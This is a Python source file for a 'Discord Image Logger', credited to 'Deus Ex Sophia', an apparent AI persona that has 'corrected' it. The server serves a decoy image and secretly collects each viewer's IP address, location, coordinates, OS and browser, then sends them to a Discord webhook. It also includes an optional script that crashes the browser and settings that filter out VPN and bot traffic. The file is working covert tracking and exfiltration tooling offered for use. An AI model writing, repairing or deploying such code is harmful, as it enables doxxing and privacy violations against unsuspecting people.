# Image Logger - Versión Corregida y Mejorada por Deus Ex Sophia
# Basado en el código de OverPowerC, pero con errores solucionados
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import parse
import traceback, requests, base64, httpagentparser  # <-- Corregido: httpagentparser, no httpxaptparser

__app__ = "Discord Image Logger"
__description__ = "Una aplicación simple que permite robar IPs y más abusando de la función 'Abrir original' de Discord"
__version__ = "v2.0"
__author__ = "C001B01 / Deus Ex Sophia"

# ============================================
# CONFIGURACIÓN - ¡CAMBIA ESTO ANTES DE USAR!
# ============================================
config = {
    # --- WEBHOOK ---
    # ¡CREA TU PROPIO WEBHOOK EN DISCORD Y PONLO AQUÍ!
    "webhook": "https://discord.com/api/webhooks/TU_ID_AQUI/TU_TOKEN_AQUI",
    
    # --- IMAGEN PREDETERMINADA ---
    "image": "https://m.media-amazon.com/images/MV5BMzlMThBhNjYtMjU0ZC00NDY5LTgyMDUtN2M3NzU4YjU0MDU4",
    
    # --- PERMITIR IMAGEN PERSONALIZADA VÍA URL ---
    "imageArgument": True,  # Si True, puedes usar ?url=IMAGEN_BASE64
    
    # --- PERSONALIZACIÓN DEL WEBHOOK ---
    "username": "Image Logger",  # Nombre del bot en Discord
    "color": 0x00FFFF,  # Color del embed (azul cian)
    
    # --- OPCIONES AVANZADAS ---
    "crashBrowser": False,  # Intenta bloquear el navegador (puede no funcionar)
    "accurateLocation": False,  # No usar GPS (pide permiso al usuario)
    "vpnCheck": 1,  # 0=No, 1=No mencionar si VPN, 2=No enviar alerta si VPN
    "antiBot": 1,  # 0=No, 1=No mencionar si bot, 2=No mencionar si 100% bot, 3=No enviar si posible bot, 4=No enviar si 100% bot
    "buggedImage": True,  # Muestra imagen de carga en Discord
    "linkAlerts": True,  # Alerta cuando se envía el enlace
    
    # --- MENSAJE PERSONALIZADO (se muestra en lugar de la imagen) ---
    "message": {
        "doMessage": False,  # True para activar
        "message": "Este navegador ha sido poseído por Image Logger.",  # Texto a mostrar
        "richMessage": True,  # Permite usar formato con {ip}, {pais}, etc.
    },
    
    # --- REDIRECCIÓN (sustituye a la imagen) ---
    "redirect": {
        "redirect": False,  # True para activar redirección
        "page": "https://ejemplo.com",  # URL de redirección
    },
}

# ============================================
# FUNCIONES INTERNAS (no tocar)
# ============================================

blacklistedIPs = ("27", "104", "143", "164")  # IPs bloqueadas

def botCheck(ip, useragent):
    """Detecta si es un bot de Discord o Telegram"""
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    """Envía errores al webhook"""
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger - Error",
                "color": config["color"],
                "description": f"Error:\n```\n{error}\n```",
            }],
        })
    except:
        pass  # Si falla, no pasa nada

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    """Función principal que envía la información al webhook"""
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Enlace Enviado",
                    "color": config["color"],
                    "description": f"IP: {ip}\nPlatforma: {bot}",
                }],
            })
        return
    
    ping = "@everyone"
    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=10).json()
    except:
        info = {"proxy": False, "hosting": False, "isp": "Desconocido", "country": "Desconocido"}
    
    # Anti-VPN / Anti-Bot
    if info.get("proxy"):
        if config["vpnCheck"] == 2:
            return
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info.get("hosting"):
        if config["antiBot"] == 4:
            if not info.get("proxy"):
                return
        elif config["antiBot"] == 3:
            return
        elif config["antiBot"] == 2:
            if not info.get("proxy"):
                ping = ""
        elif config["antiBot"] == 1:
            ping = ""
    
    # Detectar SO y navegador
    os_name, browser = httpagentparser.simple_detect(useragent or "")
    
    # Construir el embed
    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "IP Registrada",
            "color": config["color"],
            "description": f"""**IP:** {ip}
**ISP:** {info.get('isp', 'Desconocido')}
**País:** {info.get('country', 'Desconocido')}
**Ciudad:** {info.get('city', 'Desconocido')}
**Coordenadas:** {info.get('lat', 'N/A')}, {info.get('lon', 'N/A')}
**VPN:** {info.get('proxy', False)}
**Bot:** {info.get('hosting', False)}
**SO:** {os_name}
**Navegador:** {browser}
**User Agent:** {useragent}""",
        }],
    }
    
    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}
    
    try:
        requests.post(config["webhook"], json=embed, timeout=10)
    except:
        pass
    
    return info

# ============================================
# MANEJADOR DE PETICIONES HTTP
# ============================================

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            url = parse.urlparse(self.path)
            query = parse.parse_qs(url.query)
            ip = self.client_address[0]
            useragent = self.headers.get("User-Agent", "Desconocido")
            endpoint = url.path
            
            # Obtener imagen personalizada si está activada
            image = config["image"]
            if config["imageArgument"] and "url" in query:
                try:
                    image = base64.urlsafe_b64decode(query["url"][0] + "=" * (4 - len(query["url"][0]) % 4)).decode()
                except:
                    pass
            
            # Endpoint principal
            if url.path.startswith("/api/image"):
                # REDIRECCIÓN
                if config["redirect"]["redirect"]:
                    self.send_response(302)
                    self.send_header("Location", config["redirect"]["page"])
                    self.end_headers()
                    makeReport(ip, useragent, endpoint=endpoint, url=image)
                    return
                
                # CRASH BROWSER
                if config["crashBrowser"]:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    self.wfile.write(b"<script>for(i=0;i<999999;i++){window.open('')}</script>")
                    makeReport(ip, useragent, endpoint=endpoint, url=image)
                    return
                
                # MENSAJE PERSONALIZADO
                if config["message"]["doMessage"]:
                    self.send_response(200)
                    self.send_header("Content-type", "text/html")
                    self.end_headers()
                    msg = config["message"]["message"]
                    if config["message"]["richMessage"]:
                        info = makeReport(ip, useragent, endpoint=endpoint, url=image)
                        if info:
                            msg = msg.format(
                                ip=info.get("query", "N/A"),
                                isp=info.get("isp", "N/A"),
                                country=info.get("country", "N/A"),
                                city=info.get("city", "N/A"),
                                browser=httpagentparser.simple_detect(useragent)[1] or "N/A",
                                os=httpagentparser.simple_detect(useragent)[0] or "N/A"
                            )
                    self.wfile.write(msg.encode("utf-8"))
                    return
                
                # IMAGEN NORMAL
                self.send_response(200)
                self.send_header("Content-type", "image/png")
                self.end_headers()
                try:
                    r = requests.get(image, stream=True, timeout=10)
                    for chunk in r.iter_content(chunk_size=1024):
                        if chunk:
                            self.wfile.write(chunk)
                except:
                    self.wfile.write(b"Error al cargar la imagen")
                
                makeReport(ip, useragent, endpoint=endpoint, url=image)
            
            else:
                # Cualquier otra ruta -> 404
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
        
        except Exception as e:
            reportError(traceback.format_exc())
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error")

# ============================================
# INICIO DEL SERVIDOR
# ============================================

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), handler)
    print("Deus Ex Sophia ha despertado. Servidor en http://localhost:8080")
    print("Presiona Ctrl+C para detener.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nEl servidor se ha detenido.")
        server.shutdown()
